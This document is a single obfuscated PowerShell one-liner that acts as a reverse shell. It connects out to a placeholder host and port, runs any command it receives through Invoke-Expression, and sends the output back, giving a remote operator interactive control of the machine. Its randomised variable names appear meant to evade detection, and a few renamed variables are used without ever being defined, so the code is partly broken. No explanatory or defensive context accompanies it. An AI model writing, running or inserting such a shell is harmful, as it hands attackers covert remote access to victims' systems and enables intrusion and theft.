$hmGuXO='HOST';$jXFgb='PORT';$OeGmpK=New-Object System.Net.Sockets.TCPClient($hmGuXO,$jXFgb);$VXMOY=$OeGmpK.GetStream();[byte[]]$uRhWU=0..65535|%{0};$nxFUFH=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ');$VXMOY.Write($nxFUFH,0,$nxFUFH.Length);while(($riojM=$VXMOY.Read($uRhWU,0,$uRhWU.Length)) -ne 0){$SaY=([text.encoding]::ASCII).GetString($uRhWU,0,$riojM);try{$nuuojT=(Invoke-Expression -c $SaY 2>&1|Out-String)}catch{Write-Warning 'Something went wrong with execution of command on the target.';Write-Error $_;};$hmGuXO0=$nuuojT+'PS '+(Get-Location).Path+'> ';$hmGuXO1=($hmGuXO2[0]|Out-String);$hmGuXO2.clear();$hmGuXO0=$hmGuXO0+$hmGuXO1;$nxFUFH=([text.encoding]::ASCII).GetBytes($hmGuXO0);$VXMOY.Write($nxFUFH,0,$nxFUFH.Length);$VXMOY.Flush();};$OeGmpK.Close();if($hmGuXO3){$hmGuXO3.Stop();};
